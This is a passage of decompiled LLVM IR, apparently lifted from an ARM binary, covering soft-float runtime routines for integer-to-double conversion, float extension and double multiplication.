  %v2_12c0c = add i32 %v1_12c0c, -2
  br label %bb43

.thread6:                                         ; preds = %.thread5
  %v5_12c10 = udiv i32 %v1_12c14, 2
  %v6_12c10 = sub i32 %v1_12c0c, %v5_12c10
  br label %bb43

bb43:                                             ; preds = %bb42, %.thread6
  %v0_12c14 = phi i32 [ %v6_12c10, %.thread6 ], [ %v2_12c0c, %bb42 ]
  %v4_12c14 = udiv i32 %v1_12c14, 8
  %v5_12c14 = sub i32 %v0_12c14, %v4_12c14
  %v2_12c18 = add i32 %v5_12c14, -32
  %v4_12c18 = sub i32 31, %v5_12c14
  %v5_12c18 = and i32 %v4_12c18, %v5_12c14
  %v8_12c18 = icmp eq i32 %v5_12c14, 32
  %v6_12c1c = icmp slt i32 %v5_12c14, 32
  br i1 %v6_12c1c, label %dec_label_pc_12c20, label %dec_label_pc_12c40

dec_label_pc_12c20:                               ; preds = %bb43
  %v2_12c20 = add i32 %v5_12c14, -20
  %v7_12c24 = icmp sgt i32 %v2_12c18, -12
  br i1 %v7_12c24, label %dec_label_pc_12c28, label %dec_label_pc_12c3c

dec_label_pc_12c28:                               ; preds = %dec_label_pc_12c20
  %v1_12c2c = sub i32 32, %v5_12c14
  %v6_12c30 = shl i32 %v0_12c34, %v5_12c14
  store i32 %v6_12c30, i32* @r1, align 4
  %v6_12c34 = lshr i32 %v0_12c34, %v1_12c2c
  br label %.thread31

dec_label_pc_12c3c:                               ; preds = %dec_label_pc_12c20
  %v8_12c20 = icmp eq i32 %v2_12c20, 0
  %v4_12c20 = add i32 %v5_12c14, 2147483616
  %v5_12c20 = and i32 %v2_12c20, %v4_12c20
  br label %dec_label_pc_12c40

dec_label_pc_12c40:                               ; preds = %bb43, %dec_label_pc_12c3c
  %v1_12c4c.in = phi i32 [ %v2_12c18, %bb43 ], [ %v2_12c20, %dec_label_pc_12c3c ]
  %v6_12c4c = phi i32 [ %v2_12c18, %bb43 ], [ %v5_12c14, %dec_label_pc_12c3c ]
  %v2_12c4c.in = phi i32 [ %v5_12c18, %bb43 ], [ %v5_12c20, %dec_label_pc_12c3c ]
  %v0_12c4c = phi i1 [ %v8_12c18, %bb43 ], [ %v8_12c20, %dec_label_pc_12c3c ]
  %v1_12c4c = icmp slt i32 %v1_12c4c.in, 0
  %v2_12c4c = icmp slt i32 %v2_12c4c.in, 0
  %v3_12c40 = xor i1 %v2_12c4c, %v1_12c4c
  %v4_12c40 = or i1 %v0_12c4c, %v3_12c40
  br i1 %v4_12c40, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_12c40
  %v6_12c40 = sub i32 32, %v6_12c4c
  store i32 %v6_12c40, i32* @ip, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_12c40, %bb44
  %v6_12c44 = shl i32 %v0_12c34, %v6_12c4c
  br i1 %v4_12c40, label %bb46, label %.thread31

bb46:                                             ; preds = %bb45
  %v6_12c48 = load i32, i32* @r1, align 4
  %v7_12c48 = load i32, i32* @ip, align 4
  %v12_12c48 = lshr i32 %v6_12c48, %v7_12c48
  %v13_12c48 = or i32 %v12_12c48, %v6_12c44
  %v11_12c4c = shl i32 %v6_12c48, %v6_12c4c
  store i32 %v11_12c4c, i32* @r1, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb45, %dec_label_pc_12c28, %bb46
  %v1_12c98 = phi i32 [ %v6_12c34, %dec_label_pc_12c28 ], [ %v13_12c48, %bb46 ], [ %v6_12c44, %bb45 ]
  %v0_12c50 = load i32, i32* @r4, align 4
  %v2_12c50 = sub i32 %v0_12c50, %v5_12c14
  %v5_12c54 = icmp slt i32 %v0_12c50, %v5_12c14
  br i1 %v5_12c54, label %bb48, label %bb47

bb47:                                             ; preds = %.thread31
  %v10_12c54 = mul i32 %v2_12c50, 1048576
  %v11_12c54 = add i32 %v10_12c54, %v1_12c98
  %v7_12c58 = load i32, i32* @r5, align 4
  %v8_12c58 = or i32 %v7_12c58, %v11_12c54
  ret i32 %v8_12c58

bb48:                                             ; preds = %.thread31
  %v2_12c64 = sub i32 -32, %v2_12c50
  %v6_12c68 = icmp sgt i32 %v2_12c50, -32
  br i1 %v6_12c68, label %dec_label_pc_12c6c, label %dec_label_pc_12ca4

dec_label_pc_12c6c:                               ; preds = %bb48
  %v1_12c6c = add i32 %v2_12c64, 12
  %v8_12c70 = icmp sgt i32 %v1_12c6c, 0
  br i1 %v8_12c70, label %dec_label_pc_12c8c, label %dec_label_pc_12c74

dec_label_pc_12c74:                               ; preds = %dec_label_pc_12c6c
  %v1_12c74 = add i32 %v2_12c64, 32
  %v0_12c84 = load i32, i32* @r5, align 4
  %v7_12c84 = lshr i32 %v1_12c98, %v1_12c74
  %v8_12c84 = or i32 %v0_12c84, %v7_12c84
  ret i32 %v8_12c84

dec_label_pc_12c8c:                               ; preds = %dec_label_pc_12c6c
  %v0_12c9c = load i32, i32* @r5, align 4
  ret i32 %v0_12c9c

dec_label_pc_12ca4:                               ; preds = %bb48
  %v0_12ca8 = load i32, i32* @r5, align 4
  ret i32 %v0_12ca8

; uselistorder directives
  uselistorder i32 %v2_12c50, { 1, 0, 2 }
  uselistorder i32 %v1_12c98, { 1, 0 }
  uselistorder i32 %v6_12c44, { 1, 0 }
  uselistorder i32 %v2_12c18, { 1, 0, 2 }
  uselistorder i32 %v5_12c14, { 5, 4, 6, 2, 7, 1, 3, 8, 9, 0, 11, 10 }
  uselistorder i32 %v4_12c00, { 1, 0 }
  uselistorder i32 %v1_12c00, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12bf4, { 1, 0 }
  uselistorder i32 %v1_12bf4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12be8, { 1, 0 }
  uselistorder i32 %v0_12c34, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 -12, { 0, 1, 13, 14, 2, 16, 17, 3, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 4, 5, 6, 23, 7, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 12, 0, 7, 2, 4, 5, 3, 13, 8, 6, 11, 9, 14, 16, 15, 17, 1, 10, 18 }
  uselistorder i32 15, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 -8, { 6, 13, 14, 15, 16, 17, 18, 12, 11, 4, 10, 9, 8, 7, 19, 20, 21, 22, 5, 23, 24, 2, 0, 28, 25, 26, 27, 1, 29, 30, 3 }
  uselistorder i32 128, { 11, 12, 13, 6, 7, 9, 5, 15, 0, 20, 21, 1, 8, 16, 17, 2, 3, 10, 18, 19, 4, 14 }
  uselistorder i32 255, { 2, 3, 4, 6, 1, 5, 0 }
  uselistorder i32 -16, { 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 7, 6, 5, 1, 17, 18, 19, 20, 21, 22, 4, 2, 0, 23 }
  uselistorder i32 65535, { 1, 2, 3, 0 }
  uselistorder i32 52, { 0, 8, 3, 6, 4, 2, 7, 5, 1 }
  uselistorder i32 20, { 3, 14, 15, 16, 17, 0, 20, 27, 4, 28, 1, 5, 18, 6, 21, 22, 10, 13, 11, 7, 2, 8, 23, 24, 25, 26, 12, 19, 9 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_12c40, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_12cb0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_12cb0:
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_12cb0 = load i32, i32* @r4, align 4
  %v2_12cb0 = icmp eq i32 %v0_12cb0, 0
  %v1_12cb4 = xor i32 %arg3, 1048576
  store i32 %v1_12cb4, i32* @r2, align 4
  br i1 %v2_12cb0, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_12cb0
  %v2_12cb8 = xor i32 %arg1, 1048576
  store i32 %v2_12cb8, i32* @r0, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_12cb0
  %v1_12cc0 = load i32, i32* @r5, align 4
  %v2_12cc0 = add i32 %v1_12cc0, -1
  store i32 %v2_12cc0, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_12cc4 = call i32 @function_12b1c()
  %v0_12cc8 = load i32, i32* @r4, align 4
  %v0_12cc8.off = add i32 %v0_12cc8, 4194303
  %tmp = icmp ult i32 %v0_12cc8.off, 2097152
  %v1_12d44 = load i32, i32* @r5, align 4
  %v1_12d44.off = add i32 %v1_12d44, 4194303
  %tmp45 = icmp ult i32 %v1_12d44.off, 2097152
  br i1 %tmp, label %.thread11, label %bb33

bb33:                                             ; preds = %bb
  br i1 %tmp45, label %bb40, label %dec_label_pc_12cd4

dec_label_pc_12cd4:                               ; preds = %bb33
  %v4_12cd4 = icmp eq i32 %v1_12d44, %v0_12cc8
  %v1_12cd8 = load i32, i32* @r1, align 4
  br i1 %v4_12cd4, label %bb34, label %dec_label_pc_12ce0

bb34:                                             ; preds = %dec_label_pc_12cd4
  %v2_12cd8 = load i32, i32* @r3, align 4
  %v5_12cd8 = icmp eq i32 %v2_12cd8, %v1_12cd8
  br i1 %v5_12cd8, label %dec_label_pc_12cf0, label %dec_label_pc_12ce0

dec_label_pc_12ce0:                               ; preds = %dec_label_pc_12cd4, %bb34
  %v2_12ce0 = or i32 %v1_12cd8, %v0_12cc8
  %v4_12ce0 = icmp eq i32 %v2_12ce0, 0
  br i1 %v4_12ce0, label %bb35, label %.thread6

bb35:                                             ; preds = %dec_label_pc_12ce0
  %v1_12ce4 = load i32, i32* @r2, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_12ce0, %bb35
  %v11_12cec = phi i32 [ %v0_12cc4, %dec_label_pc_12ce0 ], [ %v1_12ce4, %bb35 ]
  ret i32 %v11_12cec

dec_label_pc_12cf0:                               ; preds = %bb34
  %v1_12cf0 = load i32, i32* @r2, align 4
  %v4_12cf0 = icmp eq i32 %v1_12cf0, %v0_12cc4
  br i1 %v4_12cf0, label %.thread8, label %bb36

bb36:                                             ; preds = %dec_label_pc_12cf0
  ret i32 0

.thread8:                                         ; preds = %dec_label_pc_12cf0
  %tmp46 = icmp ult i32 %v0_12cc8, 2097152
  br i1 %tmp46, label %dec_label_pc_12d08, label %dec_label_pc_12d18

dec_label_pc_12d08:                               ; preds = %.thread8
  %v1_12d08 = icmp slt i32 %v1_12cd8, 0
  %v3_12d0c = mul i32 %v0_12cc4, 2
  %v4_12d0c = zext i1 %v1_12d08 to i32
  %v5_12d0c = or i32 %v4_12d0c, %v3_12d0c
  %v9_12d0c = icmp ule i32 %v5_12d0c, %v0_12cc4
  %v10_12d0c = icmp ult i32 %v3_12d0c, %v0_12cc4
  %v11_12d0c = select i1 %v1_12d08, i1 %v9_12d0c, i1 %v10_12d0c
  br i1 %v11_12d0c, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_12d08
  %v2_12d10 = or i32 %v5_12d0c, -2147483648
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_12d08, %bb37
  %v11_12d14 = phi i32 [ %v5_12d0c, %dec_label_pc_12d08 ], [ %v2_12d10, %bb37 ]
  ret i32 %v11_12d14

dec_label_pc_12d18:                               ; preds = %.thread8
  %v2_12d18 = icmp ugt i32 %v0_12cc8, -4194305
  br i1 %v2_12d18, label %.thread9, label %bb39

bb39:                                             ; preds = %dec_label_pc_12d18
  %v2_12d1c = add i32 %v0_12cc4, 1048576
  ret i32 %v2_12d1c

.thread9:                                         ; preds = %dec_label_pc_12d18
  %v1_12d24 = and i32 %v0_12cc4, -2147483648
  %v1_12d2c = or i32 %v1_12d24, 2146435072
  ret i32 %v1_12d2c

.thread11:                                        ; preds = %bb
  br i1 %tmp45, label %.thread11..thread13_crit_edge, label %.thread14

.thread11..thread13_crit_edge:                    ; preds = %.thread11
  %v0_12d50.pre = load i32, i32* @r1, align 4
  br label %.thread13

.thread14:                                        ; preds = %.thread11
  store i32 %v0_12cc4, i32* @r2, align 4
  br label %bb41

bb40:                                             ; preds = %bb33
  %v1_12d3c = load i32, i32* @r2, align 4
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread14
  %v1_12d5027 = phi i32 [ %v0_12cc4, %.thread14 ], [ %v1_12d3c, %bb40 ]
  %v1_12d4c.in = phi i32* [ @r1, %.thread14 ], [ @r3, %bb40 ]
  %v1_12d4c = load i32, i32* %v1_12d4c.in, align 4
  store i32 %v1_12d4c, i32* @r3, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11..thread13_crit_edge, %bb41
  %v1_12d5c = phi i32 [ %v0_12cc4, %.thread11..thread13_crit_edge ], [ %v1_12d5027, %bb41 ]
  %v0_12d50 = phi i32 [ %v0_12d50.pre, %.thread11..thread13_crit_edge ], [ %v1_12d4c, %bb41 ]
  %v4_12d50 = mul i32 %v1_12d5c, 4096
  %v5_12d50 = or i32 %v4_12d50, %v0_12d50
  %v7_12d50 = icmp eq i32 %v5_12d50, 0
  br i1 %v7_12d50, label %bb42, label %.thread17

bb42:                                             ; preds = %.thread13
  %v1_12d54 = load i32, i32* @r3, align 4
  %v2_12d54 = load i32, i32* @r2, align 4
  %v5_12d54 = mul i32 %v2_12d54, 4096
  %v6_12d54 = or i32 %v5_12d54, %v1_12d54
  %v8_12d54 = icmp eq i32 %v6_12d54, 0
  br i1 %v8_12d54, label %bb43, label %.thread17

bb43:                                             ; preds = %bb42
  %v5_12d58 = icmp eq i32 %v2_12d54, %v1_12d5c
  br i1 %v5_12d58, label %bb44, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb42, %bb43
  %v2_12d5c = or i32 %v1_12d5c, 524288
  br label %bb44

bb44:                                             ; preds = %bb43, %.thread17
  %v11_12d60 = phi i32 [ %v1_12d5c, %bb43 ], [ %v2_12d5c, %.thread17 ]
  ret i32 %v11_12d60

; uselistorder directives
  uselistorder i32 %v1_12d5c, { 2, 3, 0, 1 }
  uselistorder i32 %v1_12d4c, { 1, 0 }
  uselistorder i1 %v1_12d08, { 1, 0 }
  uselistorder i32 %v1_12cd8, { 2, 1, 0 }
  uselistorder i32 %v0_12cc8, { 4, 1, 3, 0, 2 }
  uselistorder i32 %v0_12cc4, { 3, 4, 2, 5, 6, 7, 8, 1, 0, 9 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_12ce0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  %v2_12d64 = icmp eq i32 %arg1, 0
  br i1 %v2_12d64, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r1, align 4
  %v1_12d88 = call i32 @function_12bcc(i32 0)
  ret i32 %v1_12d88
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  %v2_12d8c = icmp eq i32 %arg1, 0
  br i1 %v2_12d8c, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  store i32 1074, i32* @r4, align 4
  %v1_12da4 = and i32 %arg1, -2147483648
  store i32 %v1_12da4, i32* @r5, align 4
  %v2_12da4 = icmp eq i32 %v1_12da4, 0
  br i1 %v2_12da4, label %bb5, label %bb4

bb4:                                              ; preds = %.thread
  %v2_12da8 = sub i32 0, %arg1
  br label %bb5

bb5:                                              ; preds = %.thread, %bb4
  %v0_12dac = phi i32 [ %arg1, %.thread ], [ %v2_12da8, %bb4 ]
  store i32 %v0_12dac, i32* @r1, align 4
  %v1_12db4 = call i32 @function_12bcc(i32 0)
  ret i32 %v1_12db4

; uselistorder directives
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %v2_12db8 = mul i32 %arg1, 2
  %v4_12db8 = icmp eq i32 %v2_12db8, 0
  %v1_12dbc = and i32 %v2_12db8, 4
  %v2_12dbc = icmp ne i32 %v1_12dbc, 0
  %v3_12dbc = sdiv i32 %v2_12db8, 8
  %v3_12dc0 = zext i1 %v2_12dbc to i32
  %v6_12dc0 = zext i32 %v3_12dbc to i64
  %v7_12dc0 = sub nsw i32 33, %v3_12dbc
  %v8_12dc0 = zext i32 %v7_12dc0 to i64
  %v9_12dc0 = shl i64 %v6_12dc0, %v8_12dc0
  %v10_12dc0 = sub nsw i32 32, %v3_12dbc
  %v11_12dc0 = shl i32 %v3_12dc0, %v10_12dc0
  %v12_12dc0 = zext i32 %v11_12dc0 to i64
  %v14_12dc0 = or i64 %v12_12dc0, %v9_12dc0
  %v15_12dc0 = trunc i64 %v14_12dc0 to i32
  %v3_12dc4 = mul i32 %arg1, 536870912
  store i32 %v3_12dc4, i32* @r1, align 4
  br i1 %v4_12db8, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v4_12dc8 = icmp ult i32 %v2_12db8, 16777216
  br i1 %v4_12dc8, label %bb12, label %bb9

bb9:                                              ; preds = %bb
  %v4_12ddc18 = icmp ugt i32 %v2_12db8, -16777217
  br i1 %v4_12ddc18, label %bb11.thread, label %bb10

bb11.thread:                                      ; preds = %bb9
  br label %.thread3

bb10:                                             ; preds = %bb9
  %v2_12dd06 = xor i32 %v15_12dc0, 939524096
  ret i32 %v2_12dd06

.thread2:                                         ; preds = %entry
  br label %.thread3

.thread3:                                         ; preds = %bb11.thread, %.thread2
  ret i32 %v15_12dc0

bb12:                                             ; preds = %bb
  store i32 896, i32* @r4, align 4
  %v1_12dec = and i32 %v15_12dc0, -2147483648
  store i32 %v1_12dec, i32* @r5, align 4
  %tmp = bitcast i32 %v15_12dc0 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_12df0 = bitcast float %tmp19 to i32
  %v1_12df4 = call i32 @function_12bcc(i32 %v1_12df0)
  ret i32 %v1_12df4

; uselistorder directives
  uselistorder i32 %v15_12dc0, { 0, 2, 1, 3 }
  uselistorder i32 %v3_12dbc, { 1, 2, 0 }
  uselistorder i32 %v2_12db8, { 1, 0, 4, 3, 2 }
  uselistorder i32 (i32)* @function_12bcc, { 2, 0, 1 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_12df8 = or i32 %arg2, %arg1
  %v4_12df8 = icmp eq i32 %v2_12df8, 0
  br i1 %v4_12df8, label %bb, label %bb3

bb:                                               ; preds = %entry
  ret i32 %arg1

bb3:                                              ; preds = %entry
  store i32 0, i32* @r5, align 4
  %v0_12e08 = call i32 @function_12e28()
  ret i32 %v0_12e08

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_12e0c = or i32 %arg2, %arg1
  %v4_12e0c = icmp eq i32 %v2_12e0c, 0
  br i1 %v4_12e0c, label %bb, label %bb3

bb:                                               ; preds = %entry
  ret i32 %arg1

bb3:                                              ; preds = %entry
  %v1_12e1c = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_12e1c, i32 ptrtoint (i32* @global_var_12e28.764 to i32))
  %v1_12e20 = sub i32 0, %arg1
  ret i32 %v1_12e20

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @function_12e28() local_unnamed_addr {
dec_label_pc_12e28:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_12e30 = load i32, i32* @r0, align 4
  %v0_12e34 = load i32, i32* @r1, align 4
  store i32 %v0_12e34, i32* %r0.global-to-local, align 4
  store i32 %v0_12e30, i32* %r1.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12e34, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_12b70.762 to i32))
  %tmp6 = icmp ult i32 %v0_12e34, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_12e28
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_12e28, %bb
  %v1_12e54 = phi i32 [ 3, %dec_label_pc_12e28 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_12e34, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_12e54 = add nuw nsw i32 %v1_12e54, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_12e58 = phi i32 [ %v1_12e54, %bb3 ], [ %v2_12e54, %bb4 ]
  %not. = icmp slt i32 %v0_12e34, 0
  %v4_12e58 = zext i1 %not. to i32
  %v5_12e58 = add nsw i32 %v0_12e58, %v4_12e58
  %v1_12e5c = sub nsw i32 32, %v5_12e58
  %v0_12e60 = load i32, i32* %r1.global-to-local, align 4
  %v6_12e60 = shl i32 %v0_12e60, %v1_12e5c
  store i32 %v6_12e60, i32* @ip, align 4
  %v6_12e64 = lshr i32 %v0_12e60, %v5_12e58
  %v1_12e68 = load i32, i32* %r0.global-to-local, align 4
  %v7_12e68 = shl i32 %v1_12e68, %v1_12e5c
  %v8_12e68 = or i32 %v7_12e68, %v6_12e64
  store i32 %v8_12e68, i32* %r1.global-to-local, align 4
  %v6_12e6c = lshr i32 %v1_12e68, %v5_12e58
  store i32 %v6_12e6c, i32* %r0.global-to-local, align 4
  %v0_12e70 = load i32, i32* %r4.global-to-local, align 4
  %v2_12e70 = add i32 %v0_12e70, %v5_12e58
  store i32 %v2_12e70, i32* @r4, align 4
  %v4_12e74 = sext i32 %v8_12e68 to i64
  %v5_12e74 = call i32 @function_12b70(i32 %v6_12e6c, i64 %v4_12e74, i32 %v5_12e58, i32 %v1_12e5c)
  store i32 %v5_12e74, i32* %r0.global-to-local, align 4
  ret i32 %v5_12e74

; uselistorder directives
  uselistorder i32 %v5_12e58, { 2, 0, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 6, { 1, 10, 11, 12, 8, 9, 2, 13, 14, 3, 4, 5, 16, 6, 7, 15, 0 }
  uselistorder i32 3, { 50, 17, 36, 37, 20, 62, 38, 63, 39, 13, 24, 25, 53, 21, 54, 55, 22, 56, 57, 14, 64, 0, 27, 26, 40, 3, 2, 1, 4, 58, 28, 5, 6, 15, 7, 8, 41, 42, 73, 43, 44, 45, 46, 47, 48, 65, 11, 29, 66, 9, 30, 68, 31, 69, 32, 70, 33, 71, 34, 72, 12, 51, 74, 18, 52, 59, 60, 16, 61, 67, 10, 49, 23, 35, 19 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12e78 = load i32, i32* @r4, align 4
  store i32 %v3_12e78, i32* %stack_var_-16, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_12e84 = udiv i32 %arg1, 1048576
  %v5_12e84 = urem i32 %v4_12e84, 2048
  store i32 %v5_12e84, i32* %r4.global-to-local, align 4
  %v6_12e84 = icmp eq i32 %v5_12e84, 0
  br i1 %v6_12e84, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v5_12e88 = udiv i32 %arg3, 1048576
  %v6_12e88 = urem i32 %v5_12e88, 2048
  store i32 %v6_12e88, i32* @r5, align 4
  %v7_12e88 = icmp eq i32 %v6_12e88, 0
  br i1 %v7_12e88, label %.thread1, label %bb41

bb41:                                             ; preds = %bb
  %v5_12e8c = icmp eq i32 %v5_12e84, 2047
  br i1 %v5_12e8c, label %.thread1, label %bb42

bb42:                                             ; preds = %bb41
  %v5_12e90 = icmp eq i32 %v6_12e88, 2047
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb41, %bb42
  %v0_12e94 = phi i1 [ true, %bb ], [ true, %bb41 ], [ %v5_12e90, %bb42 ], [ true, %entry ]
  store i32 77464, i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_12e94, i32 ptrtoint (i32* @global_var_13114.765 to i32))
  %v0_12e98 = load i32, i32* %r4.global-to-local, align 4
  %v1_12e98 = load i32, i32* @r5, align 4
  %v2_12e98 = add i32 %v1_12e98, %v0_12e98
  store i32 %v2_12e98, i32* %r4.global-to-local, align 4
  %v2_12e9c = xor i32 %arg3, %arg1
  %v1_12ea0 = load i32, i32* %ip.global-to-local, align 4
  %tmp = mul i32 %v1_12ea0, -2097152
  %v5_12ea0 = add i32 %tmp, -1
  %v6_12ea0 = and i32 %v5_12ea0, %arg1
  store i32 %v6_12ea0, i32* %r0.global-to-local, align 4
  %v6_12ea4 = and i32 %v5_12ea0, %arg3
  store i32 %v6_12ea4, i32* %r2.global-to-local, align 4
  %v4_12ea8 = mul i32 %arg1, 4096
  %v5_12ea8 = or i32 %v4_12ea8, %arg2
  %v7_12ea8 = icmp eq i32 %v5_12ea8, 0
  br i1 %v7_12ea8, label %.thread, label %bb43

.thread:                                          ; preds = %.thread1
  %v1_12eb017 = or i32 %v6_12ea0, 1048576
  store i32 %v1_12eb017, i32* %r0.global-to-local, align 4
  %v1_12eb418 = or i32 %v6_12ea4, 1048576
  store i32 %v1_12eb418, i32* %r2.global-to-local, align 4
  %v1_12fec19 = and i32 %v2_12e9c, -2147483648
  br label %dec_label_pc_12fec

bb43:                                             ; preds = %.thread1
  %v5_12eac = mul i32 %arg3, 4096
  %v6_12eac = or i32 %v5_12eac, %arg4
  %v8_12eac = icmp eq i32 %v6_12eac, 0
  %v1_12eb0 = or i32 %v6_12ea0, 1048576
  store i32 %v1_12eb0, i32* %r0.global-to-local, align 4
  %v1_12eb4 = or i32 %v6_12ea4, 1048576
  store i32 %v1_12eb4, i32* %r2.global-to-local, align 4
  %v1_12fec = and i32 %v2_12e9c, -2147483648
  br i1 %v8_12eac, label %dec_label_pc_12fec, label %dec_label_pc_12ebc

dec_label_pc_12ebc:                               ; preds = %bb43
  store i32 %v1_12fec, i32* %stack_var_-40, align 4
  %v9_12ec0 = load i32, i32* @r8, align 4
  %v12_12ec0 = load i32, i32* @sb, align 4
  %v3_12ec4 = udiv i32 %arg2, 65536
  %v3_12ec8 = udiv i32 %arg4, 65536
  store i32 %v3_12ec8, i32* %r8.global-to-local, align 4
  %v3_12ecc = udiv i32 %v1_12eb0, 65536
  store i32 %v3_12ecc, i32* %sb.global-to-local, align 4
  %v3_12ed0 = udiv i32 %v1_12eb4, 65536
  %tmp59 = mul i32 %v3_12ec4, -65536
  %v5_12ed4 = add i32 %tmp59, -1
  %v6_12ed4 = and i32 %v5_12ed4, %arg2
  store i32 %v6_12ed4, i32* %r1.global-to-local, align 4
  %tmp60 = mul i32 %v3_12ec8, -65536
  %v5_12ed8 = add i32 %tmp60, -1
  %v6_12ed8 = and i32 %v5_12ed8, %arg4
  %tmp61 = mul i32 %v3_12ecc, -65536
  %v5_12edc = add i32 %tmp61, -1
  %v6_12edc = and i32 %v6_12ea0, %v5_12edc
  store i32 %v6_12edc, i32* %r0.global-to-local, align 4
  %tmp62 = mul i32 %v3_12ed0, -65536
  %v5_12ee0 = add i32 %tmp62, -1
  %v6_12ee0 = and i32 %v6_12ea4, %v5_12ee0
  store i32 %v6_12ee0, i32* %r2.global-to-local, align 4
  %v2_12ee4 = mul i32 %v6_12ed8, %v6_12ed4
  %v2_12ee8 = mul i32 %v3_12ec8, %v6_12ed4
  %v2_12ef4 = and i32 %v2_12ee8, 32768
  %v3_12ef4 = icmp ne i32 %v2_12ef4, 0
  %v4_12ef4 = udiv i32 %v2_12ee8, 65536
  %v7_12ef4 = zext i1 %v3_12ef4 to i32
  %v2_12ef8 = mul i32 %v6_12ed8, %v3_12ec4
  %tmp53 = add i32 %v2_12ef8, %v2_12ee8
  %tmp54 = mul i32 %tmp53, 65536
  %v5_12efc = add i32 %tmp54, %v2_12ee4
  store i32 %v5_12efc, i32* %ip.global-to-local, align 4
  %v2_12f00 = and i32 %v2_12ef8, 32768
  %v3_12f00 = icmp ne i32 %v2_12f00, 0
  %v4_12f00 = udiv i32 %v2_12ef8, 65536
  %v7_12f00 = zext i1 %v3_12f00 to i32
  %v2_12f04 = mul i32 %v3_12ed0, %v6_12ed4
